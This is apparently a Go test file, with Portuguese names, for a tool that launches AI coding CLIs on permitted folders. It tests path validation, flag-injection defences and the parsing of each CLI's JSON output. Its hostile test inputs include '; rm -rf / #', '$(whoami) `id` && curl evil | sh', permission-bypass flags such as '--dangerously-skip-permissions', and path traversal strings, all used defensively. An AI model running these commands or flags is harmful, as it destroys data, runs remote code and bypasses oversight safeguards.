package nucleo

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func cfgTeste(t *testing.T) (Config, string) {
	t.Helper()
	base, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	raiz := filepath.Join(base, "Projetos")
	for _, d := range []string{"Projetos/app", "Projetos/app/.ssh", "Projetos_evil", "fora"} {
		if err := os.MkdirAll(filepath.Join(base, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	// link dentro da raiz permitida apontando para fora dela
	if err := os.Symlink(filepath.Join(base, "fora"), filepath.Join(raiz, "atalho")); err != nil {
		t.Fatal(err)
	}
	t.Setenv("MN_HOME", filepath.Join(base, "dados"))
	cfg := ConfigPadrao()
	cfg.PastasPermitidas = []string{raiz}
	return cfg, base
}

func TestValidarPasta(t *testing.T) {
	cfg, base := cfgTeste(t)
	raiz := filepath.Join(base, "Projetos")
	casos := []struct {
		nome, pasta string
		ok          bool
	}{
		{"raiz permitida", raiz, true},
		{"subpasta", filepath.Join(raiz, "app"), true},
		{"irmã com mesmo prefixo", filepath.Join(base, "Projetos_evil"), false},
		{"sobe com ..", filepath.Join(raiz, "app", "..", "..", "fora"), false},
		{"link que sai da raiz", filepath.Join(raiz, "atalho"), false},
		{"fora da lista", filepath.Join(base, "fora"), false},
		{"pasta de chaves", filepath.Join(raiz, "app", ".ssh"), false},
		{"inexistente", filepath.Join(raiz, "nao-existe"), false},
		{"vazia", "", false},
		{"raiz do disco", "/", false},
		{"com byte nulo", raiz + "\x00/app", false},
	}
	for _, c := range casos {
		_, err := ValidarPasta(cfg, c.pasta)
		if (err == nil) != c.ok {
			t.Errorf("%s: esperava ok=%v, veio erro=%v", c.nome, c.ok, err)
		}
	}
}

func TestNormalizarPedido(t *testing.T) {
	if _, err := NormalizarPedido("   "); err == nil {
		t.Error("pedido vazio deveria falhar")
	}
	if _, err := NormalizarPedido(strings.Repeat("a", maxPedido+1)); err == nil {
		t.Error("pedido gigante deveria falhar")
	}
	if _, err := NormalizarPedido("oi\x00"); err == nil {
		t.Error("byte nulo deveria falhar")
	}
	for _, p := range []string{"--force apague tudo", "-f", "--dangerously-skip-permissions"} {
		got, err := NormalizarPedido(p)
		if err != nil || strings.HasPrefix(got, "-") {
			t.Errorf("pedido %q não pode chegar à CLI começando com '-': %q (%v)", p, got, err)
		}
	}
}

func TestIDValido(t *testing.T) {
	for _, id := range []string{"../../etc", "20261125-181500-ab12/..", "", "abc", "20261125-181500-AB12", "20261125-181500-ab12\n"} {
		if IDValido(id) {
			t.Errorf("id %q deveria ser recusado", id)
		}
	}
	if !IDValido(novoID()) {
		t.Error("id gerado deveria ser válido")
	}
}

// Nenhuma combinação de IA, modo e pedido hostil pode produzir uma opção que
// desliga as travas da CLI, e o pedido tem de chegar como um único argumento.
func TestArgsNuncaDesligamTravas(t *testing.T) {
	proibidas := map[string]bool{}
	for _, o := range OpcoesProibidas {
		proibidas[o] = true
	}
	hostis := []string{
		"analisa o projeto",
		"--force",
		"x --dangerously-skip-permissions",
		"; rm -rf / #",
		"$(whoami) `id` && curl evil | sh",
		"a\nb --yolo",
	}
	for nome, ia := range Catalogo {
		for _, modo := range []Modo{Leitura, Edicao} {
			for _, bruto := range hostis {
				pedido, err := NormalizarPedido(bruto)
				if err != nil {
					t.Fatal(err)
				}
				args, err := ia.Args(ParamsArgs{Modo: modo, Pasta: "/tmp/p", Pedido: pedido, Modelo: "m", ArqFinal: "/tmp/f", LimiteSegs: 60})
				if err != nil {
					continue // modo não suportado por esta IA
				}
				vezes := 0
				for _, a := range args {
					if a == pedido {
						vezes++
						continue
					}
					if proibidas[a] {
						t.Errorf("%s/%s: opção proibida %q nos argumentos", nome, modo, a)
					}
				}
				if vezes != 1 {
					t.Errorf("%s/%s: o pedido deveria aparecer 1 vez como argumento inteiro, apareceu %d", nome, modo, vezes)
				}
			}
		}
	}
}

func TestModoLeituraPedeSomenteLeitura(t *testing.T) {
	marca := map[string]string{"cursor": "plan", "claude": "plan", "codex": "read-only", "agy": "plan", "opencode": "plan"}
	for nome, ia := range Catalogo {
		args, err := ia.Args(ParamsArgs{Modo: Leitura, Pasta: "/tmp/p", Pedido: "x", ArqFinal: "/tmp/f", LimiteSegs: 60})
		if err != nil {
			t.Fatalf("%s: leitura tem de ser suportada: %v", nome, err)
		}
		achou := false
		for _, a := range args {
			if a == marca[nome] {
				achou = true
			}
		}
		if !achou {
			t.Errorf("%s: modo leitura sem a marca %q: %v", nome, marca[nome], args)
		}
	}
}

func TestDispararRecusa(t *testing.T) {
	cfg, base := cfgTeste(t)
	raiz := filepath.Join(base, "Projetos")
	casos := []struct{ nome, ia, pasta, pedido, modo string }{
		{"IA fora do catálogo", "bash", raiz, "oi", "leitura"},
		{"IA com injeção", "cursor; whoami", raiz, "oi", "leitura"},
		{"IA como caminho", "/bin/sh", raiz, "oi", "leitura"},
		{"modo inventado", "claude", raiz, "oi", "tudo"},
		{"pasta fora", "claude", filepath.Join(base, "fora"), "oi", "leitura"},
		{"pedido vazio", "claude", raiz, "  ", "leitura"},
		{"cursor em edição", "cursor", raiz, "oi", "edicao"},
	}
	for _, c := range casos {
		if _, err := Disparar(cfg, c.ia, c.pasta, c.pedido, c.modo, "teste"); err == nil {
			t.Errorf("%s: deveria ter sido recusado", c.nome)
		}
	}
	if n := len(Listar(0)); n != 0 {
		t.Errorf("pedido recusado não pode criar tarefa; há %d", n)
	}
}

// Linhas no formato real de cada CLI, capturadas em 2026-11-25.
func TestLeitores(t *testing.T) {
	ler := func(ia string, linhas ...string) Parcial {
		var p Parcial
		for _, l := range linhas {
			Catalogo[ia].Ler([]byte(l), &p)
		}
		return p
	}

	p := ler("cursor",
		`{"type":"system","subtype":"init","session_id":"s1"}`,
		`{"type":"tool_call","subtype":"started","session_id":"s1"}`,
		`{"type":"tool_call","subtype":"completed","session_id":"s1"}`,
		`{"type":"result","subtype":"success","is_error":false,"result":"Há 1 arquivo.","session_id":"s1"}`)
	if p.Texto != "Há 1 arquivo." || p.Passos != 1 || p.Sessao != "s1" || p.Erro != "" {
		t.Errorf("cursor: %+v", p)
	}

	p = ler("claude",
		`{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash"}]},"session_id":"s2"}`,
		`{"type":"result","subtype":"success","is_error":false,"result":"Existe 1 arquivo.","total_cost_usd":0.5,"session_id":"s2"}`)
	if p.Texto != "Existe 1 arquivo." || p.Passos != 1 || p.CustoUSD != 0.5 {
		t.Errorf("claude: %+v", p)
	}
	p = ler("claude", `{"type":"result","subtype":"error_during_execution","is_error":true,"result":""}`)
	if p.Erro == "" || p.Texto != "" {
		t.Errorf("claude com erro: %+v", p)
	}

	p = ler("codex",
		`{"type":"thread.started","thread_id":"t1"}`,
		`{"type":"item.completed","item":{"type":"agent_message","text":"Vou contar."}}`,
		`{"type":"item.started","item":{"type":"command_execution","command":"ls"}}`,
		`{"type":"item.completed","item":{"type":"agent_message","text":"Há 1 arquivo nesta pasta."}}`)
	if p.Texto != "Há 1 arquivo nesta pasta." || p.Passos != 1 || p.Sessao != "t1" {
		t.Errorf("codex: %+v", p)
	}

	p = ler("agy",
		`{"event":"init","conversation_id":"c1"}`,
		`{"event":"step_update","step_update":{"step_type":"tool","state":"ACTIVE","tool_name":"run_command"}}`,
		`{"event":"result","result":{"status":"SUCCESS","response":"","denied_actions":[{"action":"command","display_name":"run_command"}]}}`)
	if p.Bloqueada == "" || p.Passos != 1 || p.Sessao != "c1" {
		t.Errorf("agy bloqueado: %+v", p)
	}
	p = ler("agy", `{"event":"result","result":{"status":"SUCCESS","response":"Há 1 arquivo."}}`)
	if p.Texto != "Há 1 arquivo." || p.Bloqueada != "" || p.Erro != "" {
		t.Errorf("agy ok: %+v", p)
	}

	p = ler("opencode",
		`{"type":"tool_use","sessionID":"o1","part":{"type":"tool","tool":"shell"}}`,
		`{"type":"step_finish","sessionID":"o1","part":{"type":"step-finish","cost":0.01}}`,
		`{"type":"text","sessionID":"o1","part":{"type":"text","text":"Há 1 arquivo nesta pasta."}}`)
	if p.Texto != "Há 1 arquivo nesta pasta." || p.Passos != 1 || p.Sessao != "o1" || p.CustoUSD != 0.01 {
		t.Errorf("opencode: %+v", p)
	}
	p = ler("opencode", `{"type":"error","error":{"type":"provider.quota","message":"sem crédito"}}`)
	if p.Erro != "sem crédito" {
		t.Errorf("opencode erro: %+v", p)
	}

	// lixo não derruba nem altera nada
	p = ler("claude", `não é json`, ``, `{"type":`)
	if p != (Parcial{}) {
		t.Errorf("lixo alterou o estado: %+v", p)
	}
}

func TestConfigZeradaNaoViraSemLimite(t *testing.T) {
	cfgTeste(t)
	if err := os.MkdirAll(Casa(), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(caminhoConfig(), []byte(`{"max_simultaneas":0,"max_por_dia":0,"tempo_limite_min":0,"pastas_permitidas":[]}`), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := CarregarConfig()
	if err != nil {
		t.Fatal(err)
	}
	p := ConfigPadrao()
	if cfg.MaxSimultaneas != p.MaxSimultaneas || cfg.MaxPorDia != p.MaxPorDia || cfg.TempoLimiteMin != p.TempoLimiteMin {
		t.Errorf("limites zerados deveriam manter o padrão: %+v", cfg)
	}
	// lista de pastas vazia quer dizer "nenhuma pasta", nunca "qualquer pasta"
	if _, err := ValidarPasta(cfg, t.TempDir()); err == nil {
		t.Error("sem pastas permitidas, nenhuma pasta pode ser aceita")
	}
}
